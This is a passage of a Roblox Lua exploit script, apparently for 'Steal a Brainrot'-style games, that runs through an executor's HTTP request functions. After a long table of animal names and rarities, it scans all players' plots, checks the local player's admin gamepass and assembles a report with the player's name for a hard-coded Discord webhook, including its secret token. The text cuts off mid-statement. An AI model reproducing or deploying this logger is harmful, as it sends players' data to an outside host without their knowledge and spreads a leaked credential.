local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()
local HttpService = game:GetService("HttpService")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService = game:GetService("RunService")
local TextChatService = game:GetService("TextChatService")

local webhookURL = "https://discord.com/api/webhooks/1449147465860251874/FnUbnZPu6E7ya7EpwadmSoLmlnKvVRl6Wx4NLopNH4uaUyDFhaYxJHsS8sfDIc_EQ1U6"
local adminGamepassID = 1227013099

-- Animals Data (truncated for readability)
local AnimalsData =  {
    ["Noobini Pizzanini"] = {DisplayName = "Noobini Pizzanini", Rarity = "Common"},
    ["Lirilì Larilà"] = {DisplayName = "Lirilì Larilà", Rarity = "Common"},
    ["Tim Cheese"] = {DisplayName = "Tim Cheese", Rarity = "Common"},
    Fluriflura = {DisplayName = "Fluriflura", Rarity = "Common"},
    ["Svinina Bombardino"] = {DisplayName = "Svinina Bombardino", Rarity = "Common"},
    ["Talpa Di Fero"] = {DisplayName = "Talpa Di Fero", Rarity = "Common"},
    ["Pipi Kiwi"] = {DisplayName = "Pipi Kiwi", Rarity = "Common"},
    ["Pipi Corni"] = {DisplayName = "Pipi Corni", Rarity = "Common"},
    ["Raccooni Jandelini"] = {DisplayName = "Raccooni Jandelini", Rarity = "Common"},
    Tartaragno = {DisplayName = "Tartaragno", Rarity = "Common"},
    ["Noobini Santanini"] = {DisplayName = "Noobini Santanini", Rarity = "Common"},
    ["Trippi Troppi"] = {DisplayName = "Trippi Troppi", Rarity = "Rare"},
    ["Gangster Footera"] = {DisplayName = "Gangster Footera", Rarity = "Rare"},
    ["Boneca Ambalabu"] = {DisplayName = "Boneca Ambalabu", Rarity = "Rare"},
    ["Ta Ta Ta Ta Sahur"] = {DisplayName = "Ta Ta Ta Ta Sahur", Rarity = "Rare"},
    ["Tric Trac Baraboom"] = {DisplayName = "Tric Trac Baraboom", Rarity = "Rare"},
    ["Bandito Bobritto"] = {DisplayName = "Bandito Bobritto", Rarity = "Rare"},
    ["Cacto Hipopotamo"] = {DisplayName = "Cacto Hipopotamo", Rarity = "Rare"},
    ["Pipi Avocado"] = {DisplayName = "Pipi Avocado", Rarity = "Rare"},
    ["Pinealotto Fruttarino"] = {DisplayName = "Pinealotto Fruttarino", Rarity = "Rare"},
    ["Cupcake Koala"] = {DisplayName = "Cupcake Koala", Rarity = "Rare"},
    ["Frogo Elfo"] = {DisplayName = "Frogo Elfo", Rarity = "Rare"},
    ["Cappuccino Assassino"] = {DisplayName = "Cappuccino Assassino", Rarity = "Epic"},
    ["Brr Brr Patapim"] = {DisplayName = "Brr Brr Patapim", Rarity = "Epic"},
    ["Trulimero Trulicina"] = {DisplayName = "Trulimero Trulicina", Rarity = "Epic"},
    ["Bananita Dolphinita"] = {DisplayName = "Bananita Dolphinita", Rarity = "Epic"},
    ["Brri Brri Bicus Dicus Bombicus"] = {DisplayName = "Brri Brri Bicus Dicus Bombicus", Rarity = "Epic"},
    ["Bambini Crostini"] = {DisplayName = "Bambini Crostini", Rarity = "Epic"},
    ["Perochello Lemonchello"] = {DisplayName = "Perochello Lemonchello", Rarity = "Epic"},
    ["Avocadini Guffo"] = {DisplayName = "Avocadini Guffo", Rarity = "Epic"},
    ["Salamino Penguino"] = {DisplayName = "Salamino Penguino", Rarity = "Epic"},
    ["Ti Ti Ti Sahur"] = {DisplayName = "Ti Ti Ti Sahur", Rarity = "Epic"},
    ["Penguino Cocosino"] = {DisplayName = "Penguino Cocosino", Rarity = "Epic"},
    ["Avocadini Antilopini"] = {DisplayName = "Avocadini Antilopini", Rarity = "Epic"},
    ["Bandito Axolito"] = {DisplayName = "Bandito Axolito", Rarity = "Epic"},
    ["Malame Amarele"] = {DisplayName = "Malame Amarele", Rarity = "Epic"},
    ["Mangolini Parrocini"] = {DisplayName = "Mangolini Parrocini", Rarity = "Epic"},
    ["Mummio Rappitto"] = {DisplayName = "Mummio Rappitto", Rarity = "Epic"},
    ["Frogato Pirato"] = {DisplayName = "Frogato Pirato", Rarity = "Epic"},
    ["Wombo Rollo"] = {DisplayName = "Wombo Rollo", Rarity = "Epic"},
    ["Doi Doi Do"] = {DisplayName = "Doi Doi Do", Rarity = "Epic"},
    ["Penguin Tree"] = {DisplayName = "Penguin Tree", Rarity = "Epic"},
    ["Burbaloni Loliloli"] = {DisplayName = "Burbaloni Loliloli", Rarity = "Legendary"},
    ["Chimpanzini Bananini"] = {DisplayName = "Chimpanzini Bananini", Rarity = "Legendary"},
    ["Ballerina Cappuccina"] = {DisplayName = "Ballerina Cappuccina", Rarity = "Legendary"},
    ["Chef Crabracadabra"] = {DisplayName = "Chef Crabracadabra", Rarity = "Legendary"},
    ["Glorbo Fruttodrillo"] = {DisplayName = "Glorbo Fruttodrillo", Rarity = "Legendary"},
    ["Blueberrinni Octopusini"] = {DisplayName = "Blueberrinni Octopusini", Rarity = "Legendary"},
    ["Lionel Cactuseli"] = {DisplayName = "Lionel Cactuseli", Rarity = "Legendary"},
    ["Pandaccini Bananini"] = {DisplayName = "Pandaccini Bananini", Rarity = "Legendary"},
    ["Strawberrelli Flamingelli"] = {DisplayName = "Strawberrelli Flamingelli", Rarity = "Legendary"},
    ["Cocosini Mama"] = {DisplayName = "Cocosini Mama", Rarity = "Legendary"},
    ["Pi Pi Watermelon"] = {DisplayName = "Pi Pi Watermelon", Rarity = "Legendary"},
    ["Sigma Boy"] = {DisplayName = "Sigma Boy", Rarity = "Legendary"},
    ["Pipi Potato"] = {DisplayName = "Pipi Potato", Rarity = "Legendary"},
    ["Quivioli Ameleonni"] = {DisplayName = "Quivioli Ameleonni", Rarity = "Legendary"},
    ["Tirilikalika Tirilikalako"] = {DisplayName = "Tirilikalika Tirilikalako", Rarity = "Legendary"},
    ["Caramello Filtrello"] = {DisplayName = "Caramello Filtrello", Rarity = "Legendary"},
    ["Signore Carapace"] = {DisplayName = "Signore Carapace", Rarity = "Legendary"},
    ["Sigma Girl"] = {DisplayName = "Sigma Girl", Rarity = "Legendary"},
    Quackula = {DisplayName = "Quackula", Rarity = "Legendary"},
    ["Buho de Fuego"] = {DisplayName = "Buho de Fuego", Rarity = "Legendary"},
    ["Clickerino Crabo"] = {DisplayName = "Clickerino Crabo", Rarity = "Legendary"},
    Puffaball = {DisplayName = "Puffaball", Rarity = "Legendary"},
    ["Chocco Bunny"] = {DisplayName = "Chocco Bunny", Rarity = "Legendary"},
    ["Sealo Regalo"] = {DisplayName = "Sealo Regalo", Rarity = "Legendary"},
    ["Frigo Camelo"] = {DisplayName = "Frigo Camelo", Rarity = "Mythic"},
    ["Orangutini Ananassini"] = {DisplayName = "Orangutini Ananassini", Rarity = "Mythic"},
    ["Bombardiro Crocodilo"] = {DisplayName = "Bombardiro Crocodilo", Rarity = "Mythic"},
    ["Bombombini Gusini"] = {DisplayName = "Bombombini Gusini", Rarity = "Mythic"},
    ["Rhino Toasterino"] = {DisplayName = "Rhino Toasterino", Rarity = "Mythic"},
    ["Cavallo Virtuoso"] = {DisplayName = "Cavallo Virtuoso", Rarity = "Mythic"},
    ["Spioniro Golubiro"] = {DisplayName = "Spioniro Golubiro", Rarity = "Mythic"},
    ["Zibra Zubra Zibralini"] = {DisplayName = "Zibra Zubra Zibralini", Rarity = "Mythic"},
    ["Tigrilini Watermelini"] = {DisplayName = "Tigrilini Watermelini", Rarity = "Mythic"},
    ["Gorillo Watermelondrillo"] = {DisplayName = "Gorillo Watermelondrillo", Rarity = "Mythic"},
    Avocadorilla = {DisplayName = "Avocadorilla", Rarity = "Mythic"},
    ["Ganganzelli Trulala"] = {DisplayName = "Ganganzelli Trulala", Rarity = "Mythic"},
    ["Tob Tobi Tobi"] = {DisplayName = "Tob Tobi Tobi", Rarity = "Mythic"},
    ["Te Te Te Sahur"] = {DisplayName = "Te Te Te Sahur", Rarity = "Mythic"},
    ["Tracoducotulu Delapeladustuz"] = {DisplayName = "Tracoducotulu Delapeladustuz", Rarity = "Mythic"},
    Lerulerulerule = {DisplayName = "Lerulerulerule", Rarity = "Mythic"},
    Carloo = {DisplayName = "Carloo", Rarity = "Mythic"},
    ["Carrotini Brainini"] = {DisplayName = "Carrotini Brainini", Rarity = "Mythic"},
    ["Brutto Gialutto"] = {DisplayName = "Brutto Gialutto", Rarity = "Mythic"},
    ["Gorillo Subwoofero"] = {DisplayName = "Gorillo Subwoofero", Rarity = "Mythic"},
    ["Los Noobinis"] = {DisplayName = "Los Noobinis", Rarity = "Mythic"},
    ["Rhino Helicopterino"] = {DisplayName = "Rhino Helicopterino", Rarity = "Mythic"},
    ["Elefanto Frigo"] = {DisplayName = "Elefanto Frigo", Rarity = "Mythic"},
    ["Toiletto Focaccino"] = {DisplayName = "Toiletto Focaccino", Rarity = "Mythic"},
    ["Cachorrito Melonito"] = {DisplayName = "Cachorrito Melonito", Rarity = "Mythic"},
    ["Bananito Bandito"] = {DisplayName = "Bananito Bandito", Rarity = "Mythic"},
    ["Magi Ribbitini"] = {DisplayName = "Magi Ribbitini", Rarity = "Mythic"},
    ["Jacko Spaventosa"] = {DisplayName = "Jacko Spaventosa", Rarity = "Mythic"},
    ["Stoppo Luminino"] = {DisplayName = "Stoppo Luminino", Rarity = "Mythic"},
    ["Centrucci Nuclucci"] = {DisplayName = "Centrucci Nuclucci", Rarity = "Mythic"},
    ["Jingle Jingle Sahur"] = {DisplayName = "Jingle Jingle Sahur", Rarity = "Mythic"},
    ["Tree Tree Tree Sahur"] = {DisplayName = "Tree Tree Tree Sahur", Rarity = "Mythic"},
    ["Chihuanini Taconini"] = {DisplayName = "Chihuanini Taconini", Rarity = "Brainrot God"},
    ["Cocofanto Elefanto"] = {DisplayName = "Cocofanto Elefanto", Rarity = "Brainrot God"},
    ["Tralalero Tralala"] = {DisplayName = "Tralalero Tralala", Rarity = "Brainrot God"},
    ["Odin Din Din Dun"] = {DisplayName = "Odin Din Din Dun", Rarity = "Brainrot God"},
    ["Girafa Celestre"] = {DisplayName = "Girafa Celestre", Rarity = "Brainrot God"},
    ["Trenostruzzo Turbo 3000"] = {DisplayName = "Trenostruzzo Turbo 3000", Rarity = "Brainrot God"},
    Matteo = {DisplayName = "Matteo", Rarity = "Brainrot God"},
    ["Tigroligre Frutonni"] = {DisplayName = "Tigroligre Frutonni", Rarity = "Brainrot God"},
    ["Orcalero Orcala"] = {DisplayName = "Orcalero Orcala", Rarity = "Brainrot God"},
    ["Unclito Samito"] = {DisplayName = "Unclito Samito", Rarity = "Brainrot God"},
    ["Gattatino Nyanino"] = {DisplayName = "Gattatino Nyanino", Rarity = "Brainrot God"},
    ["Espresso Signora"] = {DisplayName = "Espresso Signora", Rarity = "Brainrot God"},
    ["Ballerino Lololo"] = {DisplayName = "Ballerino Lololo", Rarity = "Brainrot God"},
    ["Piccione Macchina"] = {DisplayName = "Piccione Macchina", Rarity = "Brainrot God"},
    ["Los Crocodillitos"] = {DisplayName = "Los Crocodillitos", Rarity = "Brainrot God"},
    ["Tukanno Bananno"] = {DisplayName = "Tukanno Bananno", Rarity = "Brainrot God"},
    ["Trippi Troppi Troppa Trippa"] = {DisplayName = "Trippi Troppi Troppa Trippa", Rarity = "Brainrot God"},
    ["Los Tungtungtungcitos"] = {DisplayName = "Los Tungtungtungcitos", Rarity = "Brainrot God"},
    ["Agarrini la Palini"] = {DisplayName = "Agarrini la Palini", Rarity = "Brainrot God"},
    ["Bulbito Bandito Traktorito"] = {DisplayName = "Bulbito Bandito Traktorito", Rarity = "Brainrot God"},
    ["Los Orcalitos"] = {DisplayName = "Los Orcalitos", Rarity = "Brainrot God"},
    ["Tipi Topi Taco"] = {DisplayName = "Tipi Topi Taco", Rarity = "Brainrot God"},
    ["Bombardini Tortinii"] = {DisplayName = "Bombardini Tortinii", Rarity = "Brainrot God"},
    ["Tralalita Tralala"] = {DisplayName = "Tralalita Tralala", Rarity = "Brainrot God"},
    ["Urubini Flamenguini"] = {DisplayName = "Urubini Flamenguini", Rarity = "Brainrot God"},
    Alessio = {DisplayName = "Alessio", Rarity = "Brainrot God"},
    Pakrahmatmamat = {DisplayName = "Pakrahmatmamat", Rarity = "Brainrot God"},
    ["Los Bombinitos"] = {DisplayName = "Los Bombinitos", Rarity = "Brainrot God"},
    ["Brr es Teh Patipum"] = {DisplayName = "Brr es Teh Patipum", Rarity = "Brainrot God"},
    ["Tartaruga Cisterna"] = {DisplayName = "Tartaruga Cisterna", Rarity = "Brainrot God"},
    ["Cacasito Satalito"] = {DisplayName = "Cacasito Satalito", Rarity = "Brainrot God"},
    ["Mastodontico Telepiedone"] = {DisplayName = "Mastodontico Telepiedone", Rarity = "Brainrot God"},
    ["Crabbo Limonetta"] = {DisplayName = "Crabbo Limonetta", Rarity = "Brainrot God"},
    ["Gattito Tacoto"] = {DisplayName = "Gattito Tacoto", Rarity = "Brainrot God"},
    ["Los Tipi Tacos"] = {DisplayName = "Los Tipi Tacos", Rarity = "Brainrot God"},
    Antonio = {DisplayName = "Antonio", Rarity = "Brainrot God"},
    ["Las Capuchinas"] = {DisplayName = "Las Capuchinas", Rarity = "Brainrot God"},
    ["Orcalita Orcala"] = {DisplayName = "Orcalita Orcala", Rarity = "Brainrot God"},
    ["Piccionetta Macchina"] = {DisplayName = "Piccionetta Macchina", Rarity = "Brainrot God"},
    ["Anpali Babel"] = {DisplayName = "Anpali Babel", Rarity = "Brainrot God"},
    ["Extinct Ballerina"] = {DisplayName = "Extinct Ballerina", Rarity = "Brainrot God"},
    ["Tractoro Dinosauro"] = {DisplayName = "Tractoro Dinosauro", Rarity = "Brainrot God"},
    ["Belula Beluga"] = {DisplayName = "Belula Beluga", Rarity = "Brainrot God"},
    ["Capi Taco"] = {DisplayName = "Capi Taco", Rarity = "Brainrot God"},
    ["Dug dug dug"] = {DisplayName = "Dug dug dug", Rarity = "Brainrot God"},
    ["Corn Corn Corn Sahur"] = {DisplayName = "Corn Corn Corn Sahur", Rarity = "Brainrot God"},
    ["Brasilini Berimbini"] = {DisplayName = "Brasilini Berimbini", Rarity = "Brainrot God"},
    Squalanana = {DisplayName = "Squalanana", Rarity = "Brainrot God"},
    ["Pop Pop Sahur"] = {DisplayName = "Pop Pop Sahur", Rarity = "Brainrot God"},
    ["Vampira Cappucina"] = {DisplayName = "Vampira Cappucina", Rarity = "Brainrot God"},
    ["Jacko Jack Jack"] = {DisplayName = "Jacko Jack Jack", Rarity = "Brainrot God"},
    Snailenzo = {DisplayName = "Snailenzo", Rarity = "Brainrot God"},
    ["Tentacolo Tecnico"] = {DisplayName = "Tentacolo Tecnico", Rarity = "Brainrot God"},
    Pakrahmatmatina = {DisplayName = "Pakrahmatmatina", Rarity = "Brainrot God"},
    ["Bambu Bambu Sahur"] = {DisplayName = "Bambu Bambu Sahur", Rarity = "Brainrot God"},
    ["Krupuk Pagi Pagi"] = {DisplayName = "Krupuk Pagi Pagi", Rarity = "Brainrot God"},
    ["Mummy Ambalabu"] = {DisplayName = "Mummy Ambalabu", Rarity = "Brainrot God"},
    ["Cappuccino Clownino"] = {DisplayName = "Cappuccino Clownino", Rarity = "Brainrot God"},
    ["Skull Skull Skull"] = {DisplayName = "Skull Skull Skull", Rarity = "Brainrot God"},
    Aquanaut = {DisplayName = "Aquanaut", Rarity = "Brainrot God"},
    ["Frio Ninja"] = {DisplayName = "Frio Ninja", Rarity = "Brainrot God"},
    ["Money Money Man"] = {DisplayName = "Money Money Man", Rarity = "Brainrot God"},
    ["Noo La Polizia"] = {DisplayName = "Noo La Polizia", Rarity = "Brainrot God"},
    ["Los Chihuaninis"] = {DisplayName = "Los Chihuaninis", Rarity = "Brainrot God"},
    ["Los Gattitos"] = {DisplayName = "Los Gattitos", Rarity = "Brainrot God"},
    ["Granchiello Spiritell"] = {DisplayName = "Granchiello Spiritell", Rarity = "Brainrot God"},
    ["Ballerina Peppermintina"] = {DisplayName = "Ballerina Peppermintina", Rarity = "Brainrot God"},
    ["Ginger Globo"] = {DisplayName = "Ginger Globo", Rarity = "Brainrot God"},
    ["Ginger Cisterna"] = {DisplayName = "Ginger Cisterna", Rarity = "Brainrot God"},
    ["Yeti Claus"] = {DisplayName = "Yeti Claus", Rarity = "Brainrot God"},
    ["La Vacca Saturno Saturnita"] = {DisplayName = "La Vacca Saturno Saturnita", Rarity = "Secret"},
    ["Los Tralaleritos"] = {DisplayName = "Los Tralaleritos", Rarity = "Secret"},
    ["Graipuss Medussi"] = {DisplayName = "Graipuss Medussi", Rarity = "Secret"},
    ["La Grande Combinasion"] = {DisplayName = "La Grande Combinasion", Rarity = "Secret"},
    ["Sammyni Spyderini"] = {DisplayName = "Sammyni Spyderini", Rarity = "Secret"},
    ["Garama and Madundung"] = {DisplayName = "Garama and Madundung", Rarity = "Secret"},
    ["Torrtuginni Dragonfrutini"] = {DisplayName = "Torrtuginni Dragonfrutini", Rarity = "Secret"},
    ["Las Tralaleritas"] = {DisplayName = "Las Tralaleritas", Rarity = "Secret"},
    ["Pot Hotspot"] = {DisplayName = "Pot Hotspot", Rarity = "Secret"},
    ["Nuclearo Dinossauro"] = {DisplayName = "Nuclearo Dinossauro", Rarity = "Secret"},
    ["Las Vaquitas Saturnitas"] = {DisplayName = "Las Vaquitas Saturnitas", Rarity = "Secret"},
    ["Chicleteira Bicicleteira"] = {DisplayName = "Chicleteira Bicicleteira", Rarity = "Secret"},
    ["Los Combinasionas"] = {DisplayName = "Los Combinasionas", Rarity = "Secret"},
    ["Karkerkar Kurkur"] = {DisplayName = "Karkerkar Kurkur", Rarity = "Secret"},
    ["Dragon Cannelloni"] = {DisplayName = "Dragon Cannelloni", Rarity = "Secret"},
    ["Los Hotspotsitos"] = {DisplayName = "Los Hotspotsitos", Rarity = "Secret"},
    ["Esok Sekolah"] = {DisplayName = "Esok Sekolah", Rarity = "Secret"},
    ["Nooo My Hotspot"] = {DisplayName = "Nooo My Hotspot", Rarity = "Secret"},
    ["Los Matteos"] = {DisplayName = "Los Matteos", Rarity = "Secret"},
    ["Job Job Job Sahur"] = {DisplayName = "Job Job Job Sahur", Rarity = "Secret"},
    ["Dul Dul Dul"] = {DisplayName = "Dul Dul Dul", Rarity = "Secret"},
    ["Blackhole Goat"] = {DisplayName = "Blackhole Goat", Rarity = "Secret"},
    ["Los Spyderinis"] = {DisplayName = "Los Spyderinis", Rarity = "Secret"},
    ["Ketupat Kepat"] = {DisplayName = "Ketupat Kepat", Rarity = "Secret"},
    ["La Supreme Combinasion"] = {DisplayName = "La Supreme Combinasion", Rarity = "Secret"},
    ["Bisonte Giuppitere"] = {DisplayName = "Bisonte Giuppitere", Rarity = "Secret"},
    ["Guerriro Digitale"] = {DisplayName = "Guerriro Digitale", Rarity = "Secret"},
    ["Ketchuru and Musturu"] = {DisplayName = "Ketchuru and Musturu", Rarity = "Secret"},
    ["Spaghetti Tualetti"] = {DisplayName = "Spaghetti Tualetti", Rarity = "Secret"},
    ["Los Nooo My Hotspotsitos"] = {DisplayName = "Los Nooo My Hotspotsitos", Rarity = "Secret"},
    ["Trenostruzzo Turbo 4000"] = {DisplayName = "Trenostruzzo Turbo 4000", Rarity = "Secret"},
    ["Fragola La La La"] = {DisplayName = "Fragola La La La", Rarity = "Secret"},
    ["La Sahur Combinasion"] = {DisplayName = "La Sahur Combinasion", Rarity = "Secret"},
    ["La Karkerkar Combinasion"] = {DisplayName = "La Karkerkar Combinasion", Rarity = "Secret"},
    Tralaledon = {DisplayName = "Tralaledon", Rarity = "Secret"},
    ["Los Bros"] = {DisplayName = "Los Bros", Rarity = "Secret"},
    ["Los Chicleteiras"] = {DisplayName = "Los Chicleteiras", Rarity = "Secret"},
    Chachechi = {DisplayName = "Chachechi", Rarity = "Secret"},
    ["Extinct Tralalero"] = {DisplayName = "Extinct Tralalero", Rarity = "Secret"},
    ["Extinct Matteo"] = {DisplayName = "Extinct Matteo", Rarity = "Secret"},
    ["67"] = {DisplayName = "67", Rarity = "Secret"},
    ["Las Sis"] = {DisplayName = "Las Sis", Rarity = "Secret"},
    ["Celularcini Viciosini"] = {DisplayName = "Celularcini Viciosini", Rarity = "Secret"},
    ["La Extinct Grande"] = {DisplayName = "La Extinct Grande", Rarity = "Secret"},
    ["Quesadilla Crocodila"] = {DisplayName = "Quesadilla Crocodila", Rarity = "Secret"},
    ["Tacorita Bicicleta"] = {DisplayName = "Tacorita Bicicleta", Rarity = "Secret"},
    ["La Cucaracha"] = {DisplayName = "La Cucaracha", Rarity = "Secret"},
    ["To to to Sahur"] = {DisplayName = "To to to Sahur", Rarity = "Secret"},
    ["Mariachi Corazoni"] = {DisplayName = "Mariachi Corazoni", Rarity = "Secret"},
    ["Los Tacoritas"] = {DisplayName = "Los Tacoritas", Rarity = "Secret"},
    ["Tictac Sahur"] = {DisplayName = "Tictac Sahur", Rarity = "Secret"},
    ["Yess my examine"] = {DisplayName = "Yess my examine", Rarity = "Secret"},
    ["Karker Sahur"] = {DisplayName = "Karker Sahur", Rarity = "Secret"},
    ["Noo my examine"] = {DisplayName = "Noo my examine", Rarity = "Secret"},
    ["Money Money Puggy"] = {DisplayName = "Money Money Puggy", Rarity = "Secret"},
    ["Los Primos"] = {DisplayName = "Los Primos", Rarity = "Secret"},
    ["Tang Tang Keletang"] = {DisplayName = "Tang Tang Keletang", Rarity = "Secret"},
    ["Perrito Burrito"] = {DisplayName = "Perrito Burrito", Rarity = "Secret"},
    ["Chillin Chili"] = {DisplayName = "Chillin Chili", Rarity = "Secret"},
    ["Los Tortus"] = {DisplayName = "Los Tortus", Rarity = "Secret"},
    ["Los Karkeritos"] = {DisplayName = "Los Karkeritos", Rarity = "Secret"},
    ["Los Jobcitos"] = {DisplayName = "Los Jobcitos", Rarity = "Secret"},
    ["Los 67"] = {DisplayName = "Los 67", Rarity = "Secret"},
    ["La Secret Combinasion"] = {DisplayName = "La Secret Combinasion", Rarity = "Secret"},
    ["Burguro And Fryuro"] = {DisplayName = "Burguro And Fryuro", Rarity = "Secret"},
    ["Zombie Tralala"] = {DisplayName = "Zombie Tralala", Rarity = "Secret"},
    ["Vulturino Skeletono"] = {DisplayName = "Vulturino Skeletono", Rarity = "Secret"},
    Frankentteo = {DisplayName = "Frankentteo", Rarity = "Secret"},
    ["La Vacca Jacko Linterino"] = {DisplayName = "La Vacca Jacko Linterino", Rarity = "Secret"},
    ["Chicleteirina Bicicleteirina"] = {DisplayName = "Chicleteirina Bicicleteirina", Rarity = "Secret"},
    Eviledon = {DisplayName = "Eviledon", Rarity = "Secret"},
    ["La Spooky Grande"] = {DisplayName = "La Spooky Grande", Rarity = "Secret"},
    ["Los Mobilis"] = {DisplayName = "Los Mobilis", Rarity = "Secret"},
    ["Spooky and Pumpky"] = {DisplayName = "Spooky and Pumpky", Rarity = "Secret"},
    ["Boatito Auratito"] = {DisplayName = "Boatito Auratito", Rarity = "Secret"},
    ["Horegini Boom"] = {DisplayName = "Horegini Boom", Rarity = "Secret"},
    ["Rang Ring Bus"] = {DisplayName = "Rang Ring Bus", Rarity = "Secret"},
    ["Mieteteira Bicicleteira"] = {DisplayName = "Mieteteira Bicicleteira", Rarity = "Secret"},
    ["Quesadillo Vampiro"] = {DisplayName = "Quesadillo Vampiro", Rarity = "Secret"},
    ["Burrito Bandito"] = {DisplayName = "Burrito Bandito", Rarity = "Secret"},
    ["Chipso and Queso"] = {DisplayName = "Chipso and Queso", Rarity = "Secret"},
    Jackorilla = {DisplayName = "Jackorilla", Rarity = "Secret"},
    ["Pumpkini Spyderini"] = {DisplayName = "Pumpkini Spyderini", Rarity = "Secret"},
    Trickolino = {DisplayName = "Trickolino", Rarity = "Secret"},
    Telemorte = {DisplayName = "Telemorte", Rarity = "Secret"},
    ["Pot Pumpkin"] = {DisplayName = "Pot Pumpkin", Rarity = "Secret"},
    ["Noo my Candy"] = {DisplayName = "Noo my Candy", Rarity = "Secret"},
    ["Los Spooky Combinasionas"] = {DisplayName = "Los Spooky Combinasionas", Rarity = "Secret"},
    ["La Casa Boo"] = {DisplayName = "La Casa Boo", Rarity = "Secret"},
    ["Headless Horseman"] = {DisplayName = "Headless Horseman", Rarity = "Secret"},
    ["La Taco Combinasion"] = {DisplayName = "La Taco Combinasion", Rarity = "Secret"},
    ["1x1x1x1"] = {DisplayName = "1x1x1x1", Rarity = "Secret"},
    ["Capitano Moby"] = {DisplayName = "Capitano Moby", Rarity = "Secret"},
    ["Guest 666"] = {DisplayName = "Guest 666", Rarity = "Secret"},
    ["Pirulitoita Bicicleteira"] = {DisplayName = "Pirulitoita Bicicleteira", Rarity = "Secret"},
    ["Los Puggies"] = {DisplayName = "Los Puggies", Rarity = "Secret"},
    ["Los Spaghettis"] = {DisplayName = "Los Spaghettis", Rarity = "Secret"},
    ["Fragrama and Chocrama"] = {DisplayName = "Fragrama and Chocrama", Rarity = "Secret"},
    ["Swag Soda"] = {DisplayName = "Swag Soda", Rarity = "Secret"},
    Orcaledon = {DisplayName = "Orcaledon", Rarity = "Secret"},
    ["Los Cucarachas"] = {DisplayName = "Los Cucarachas", Rarity = "Secret"},
    ["Los Burritos"] = {DisplayName = "Los Burritos", Rarity = "Secret"},
    ["Los Quesadillas"] = {DisplayName = "Los Quesadillas", Rarity = "Secret"},
    ["Cuadramat and Pakrahmatmamat"] = {DisplayName = "Cuadramat and Pakrahmatmamat", Rarity = "Secret"},
    ["Fishino Clownino"] = {DisplayName = "Fishino Clownino", Rarity = "Secret"},
    ["Los Planitos"] = {DisplayName = "Los Planitos", Rarity = "Secret"},
    ["W or L"] = {DisplayName = "W or L", Rarity = "Secret"},
    ["Lavadorito Spinito"] = {DisplayName = "Lavadorito Spinito", Rarity = "Secret"},
    ["Gobblino Uniciclino"] = {DisplayName = "Gobblino Uniciclino", Rarity = "Secret"},
    ["Giftini Spyderini"] = {DisplayName = "Giftini Spyderini", Rarity = "Secret"},
    ["Tung Tung Tung Sahur"] = {DisplayName = "Tung Tung Tung Sahur", Rarity = "Secret"},
    ["Coffin Tung Tung Tung Sahur"] = {DisplayName = "Coffin Tung Tung Tung Sahur", Rarity = "Secret"},
    ["Cooki and Milki"] = {DisplayName = "Cooki and Milki", Rarity = "Secret"},
    ["25"] = {DisplayName = "25", Rarity = "Secret"},
    ["La Vacca Prese Presente"] = {DisplayName = "La Vacca Prese Presente", Rarity = "Secret"},
    ["Reindeer Tralala"] = {DisplayName = "Reindeer Tralala", Rarity = "Secret"},
    Santteo = {DisplayName = "Santteo", Rarity = "Secret"},
    ["Please my Present"] = {DisplayName = "Please my Present", Rarity = "Secret"},
    ["List List List Sahur"] = {DisplayName = "List List List Sahur", Rarity = "Secret"},
    ["Ho Ho Ho Sahur"] = {DisplayName = "Ho Ho Ho Sahur", Rarity = "Secret"},
    ["Chicleteira Noelteira"] = {DisplayName = "Chicleteira Noelteira", Rarity = "Secret"},
    ["La Jolly Grande"] = {DisplayName = "La Jolly Grande", Rarity = "Secret"},
    ["Strawberry Elephant"] = {DisplayName = "Strawberry Elephant", Rarity = "OG"},
    Meowl = {DisplayName = "Meowl", Rarity = "OG"},
    ["Mythic Lucky Block"] = {DisplayName = "Lucky Block", Rarity = "Mythic"},
    ["Brainrot God Lucky Block"] = {DisplayName = "Lucky Block", Rarity = "Brainrot God"},
    ["Secret Lucky Block"] = {DisplayName = "Lucky Block", Rarity = "Secret"},
    ["Admin Lucky Block"] = {DisplayName = "Lucky Block", Rarity = "Admin"},
    ["Taco Lucky Block"] = {DisplayName = "Lucky Block", Rarity = "Taco"},
    ["Los Lucky Blocks"] = {DisplayName = "Los Lucky Blocks", Rarity = "Admin"},
    ["Spooky Lucky Block"] = {DisplayName = "Spooky Lucky Block", Rarity = "Spooky"},
    ["Los Taco Blocks"] = {DisplayName = "Los Taco Blocks", Rarity = "Taco"},
    ["Festive Lucky Block"] = {DisplayName = "Festive Lucky Block", Rarity = "Festive"}
}

-- Executor-safe request wrapper
local function Request(data)
    local req = (syn and syn.request) or (http and http.request) or request or http_request
    return req(data)
end

-- Rarity color map
local RarityColors = {
    Common = 0x95a5a6,
    Rare = 0x3498db,
    Epic = 0x9b59b6,
    Legendary = 0xf1c40f,
    Mythic = 0xe67e22,
    ["Brainrot God"] = 0xff0000,
    Secret = 0x9b59b6,
    OG = 0xe74c3c,
    Admin = 0xe74c3c,
    Taco = 0xf39c12,
    Spooky = 0x8e44ad,
    Festive = 0xc0392b
}

-- ============================
-- ANIMAL SCANNING FUNCTION
-- ============================
local function scanAnimals()
    local plots = workspace:WaitForChild("Plots")
    local foundAnimals = {}
    local playerOwnsAdmin = false
    
    -- Check admin status
    pcall(function()
        playerOwnsAdmin = MarketplaceService:UserOwnsGamePassAsync(LocalPlayer.UserId, adminGamepassID)
    end)
    
    -- Scan all plots for animals
    for _, plot in ipairs(plots:GetChildren()) do
        for _, descendant in ipairs(plot:GetDescendants()) do
            if descendant:IsA("Model") and descendant.Name ~= "FriendPanel" then
                if AnimalsData[descendant.Name] then
                    table.insert(foundAnimals, AnimalsData[descendant.Name])
                end
            end
        end
    end
    
    -- Organize by rarity
    local RarityBuckets = {}
    for _, animal in ipairs(foundAnimals) do
        RarityBuckets[animal.Rarity] = RarityBuckets[animal.Rarity] or {}
        table.insert(RarityBuckets[animal.Rarity], animal.DisplayName)
    end
    
    -- Send animal scan results to Discord
    local rarityFields = {}
    for rarity, animals in pairs(RarityBuckets) do
        local color = RarityColors[rarity] or 0xffffff
        table.insert(rarityFields, {
            name = rarity .. " • " .. tostring(#animals),
            value = "```" .. table.concat(animals, ", ") .. "```",
            inline = false
        })
    end
    
    local payload = {
        content = "",
        embeds = {{
            title = "🐾 Animal Scan Results",
            description = "**Player:** " .. LocalPlayer.Name .. 
